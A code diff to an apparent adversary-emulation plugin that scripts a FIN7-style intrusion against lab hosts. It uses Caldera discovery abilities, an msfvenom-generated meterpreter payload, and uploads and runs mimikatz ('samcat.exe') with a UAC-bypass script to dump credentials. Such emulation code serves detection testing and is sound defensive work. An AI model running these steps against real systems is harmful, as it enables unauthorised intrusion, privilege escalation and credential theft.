@@ -64,39 +64,41 @@ class FIN7Plugin(AttackPlugin):
 
         # TODO: Make sure logging is nice and complete
 
+        hotelmanager = self.get_target_by_name("hotelmanager")
+
         # WMI queries  https://attack.mitre.org/techniques/T1057/
 
         # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
-        self.caldera_attack(self.targets[0], "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": self.targets[0].get_ip()})
+        self.caldera_attack(hotelmanager, "deeac480-5c2a-42b5-90bb-41675ee53c7e", parameters={"remote.host.fqdn": hotelmanager.get_ip()})
 
         # check for sandbox https://attack.mitre.org/techniques/T1497/
         # The documentation does not define how it is checking exactly.
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
-        self.caldera_attack(self.targets[0], "5dc841fd-28ad-40e2-b10e-fb007fe09e81")
+        self.caldera_attack(hotelmanager, "5dc841fd-28ad-40e2-b10e-fb007fe09e81")
 
         # query username https://attack.mitre.org/techniques/T1033/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
-        self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
+        self.caldera_attack(hotelmanager, "c0da588f-79f0-4263-8998-7496b1a40596")
 
         # TODO: query computername https://attack.mitre.org/techniques/T1082/
         # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
-        # self.caldera_attack(self.targets[0], "c0da588f-79f0-4263-8998-7496b1a40596")
+        # self.caldera_attack(hotelmanager, "c0da588f-79f0-4263-8998-7496b1a40596")
 
         # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
         # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
-        self.caldera_attack(self.targets[0], "14a21534-350f-4d83-9dd7-3c56b93a0c17")
+        self.caldera_attack(hotelmanager, "14a21534-350f-4d83-9dd7-3c56b93a0c17")
         # System Info discovery https://attack.mitre.org/techniques/T1082/
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
             1)
-        self.caldera_attack(self.targets[0], "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
+        self.caldera_attack(hotelmanager, "b6b105b9-41dc-490b-bc5c-80d699b82ce8")
         # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
             1)
-        self.caldera_attack(self.targets[0], "316251ed-6a28-4013-812b-ddf5b5b007f8")
+        self.caldera_attack(hotelmanager, "316251ed-6a28-4013-812b-ddf5b5b007f8")
         # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/
 
         self.attack_logger.vprint(
@@ -116,6 +118,7 @@ class FIN7Plugin(AttackPlugin):
         # Uploaded stager creates meterpreter shell (babymetal)
         # Generate payload:
 
+        hotelmanager = self.get_target_by_name("hotelmanager")
         payload_name = "babymetal.exe"
 
         # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps. For the proper steps see:
@@ -125,7 +128,10 @@ class FIN7Plugin(AttackPlugin):
         # -f C                : output is c code
         # --encrypt xor       : xor encrypt the results
         # --encrypt-key m     : the encryption key
-        venom = MSFVenom(self.attacker_machine_plugin, self.targets[0], self.attack_logger)
+
+        self.attacker_machine_plugin.remote_run("sudo apt install msfpc")  # MSFVenom needs to be installed
+
+        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
         venom.generate_and_deploy(payload=self.payload_type_1,
                                   architecture="x64",
                                   platform="windows",
@@ -153,7 +159,7 @@ class FIN7Plugin(AttackPlugin):
 
         # metasploit1 = self.get_metasploit_1()
         # print("Got session, calling command")
-        # print(metasploit.meterpreter_execute_on(["getuid"], self.targets[0]))
+        # print(metasploit.meterpreter_execute_on(["getuid"], hotelmanager))
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
@@ -162,53 +168,60 @@ class FIN7Plugin(AttackPlugin):
         self.attack_logger.vprint(
             f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)
 
+        hotelmanager = self.get_target_by_name("hotelmanager")
+
         # This is meterpreter !
         metasploit = self.get_metasploit_1()
 
         # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on(["ps -ax"], self.targets[0]))
+        print(metasploit.meterpreter_execute_on(["ps -ax"], hotelmanager))
 
         # powershell: GetIpNetTable() does ARP entries https://attack.mitre.org/techniques/T1016/
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on(["arp"], self.targets[0]))
+        print(metasploit.meterpreter_execute_on(["arp"], hotelmanager))
         # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
-        # TODO: Add real <itadmin> ip
-        itadmin = "127.0.0.1"
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], self.targets[0]))
+        # TODO: Add a new machine in config as <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
+        itadmin = self.get_target_by_name("itadmin")
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], hotelmanager))
 
         # Copy step 5 attack tools to attacker
 
-        # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
-        # tplayground = self.targets[0].get_playground()
-        # aplayground = self.attacker_machine_plugin.get_playground() or ""
-        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
-        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
-        cmd = "upload samcat.exe 'samcat.exe'  "
-        print(cmd)
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))
+        use_mimikatz = True   # TODO: Read this from config
+        if use_mimikatz:
+            # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
+            # tplayground = hotelmanager.get_playground()
+            # aplayground = self.attacker_machine_plugin.get_playground() or ""
+            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
+            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
+            print(metasploit.meterpreter_execute_on(["ls"], hotelmanager, delay=10))
+            cmd = "upload samcat.exe 'samcat.exe'  "
+            # cmd = "upload boring_test_file.txt 'samcat.exe'  "
+            print(cmd)
+            self.attack_logger.vprint(
+                f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
+            print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))
 
-        cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
-        print(cmd)
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))
+            cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
+            # cmd = "upload boring_test_file.txt 'samcat.exe'  "
+            print(cmd)
+            self.attack_logger.vprint(
+                f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
+            print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))
 
-        # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
-        execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
-        print(execute_samcats)
-        self.attack_logger.vprint(
-            f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on([execute_samcats], self.targets[0], delay=20))
-        # TODO: Make it more reliable. Also test which OS versions are working properly. It worked at least once
+            # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
+            execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
+            print(execute_samcats)
+            self.attack_logger.vprint(
+                f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
+            print(metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20))
 
         # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/
 
+        print("Verify we are still connected")
+        print(metasploit.meterpreter_execute_on(["ps -ax"], hotelmanager))
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)
 
@@ -221,7 +234,7 @@ class FIN7Plugin(AttackPlugin):
         # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
         # spawn powershell through cmd
         # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
-        # paexec  starts temorary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
+        # paexec  starts temporary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
         # => Lateral move to itadmin
         # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
         # svchost starts data exchange
@@ -300,9 +313,9 @@ class FIN7Plugin(AttackPlugin):
 
         self.step1()
         self.step2()
-        # self.step3()  # Done and works
-        self.step4()
-        self.step5()
+        self.step3()  # Done and works
+        self.step4()  # Partial - with a hack
+        self.step5()  # Done and quite ok
         self.step6()
         self.step7()
         self.step8()
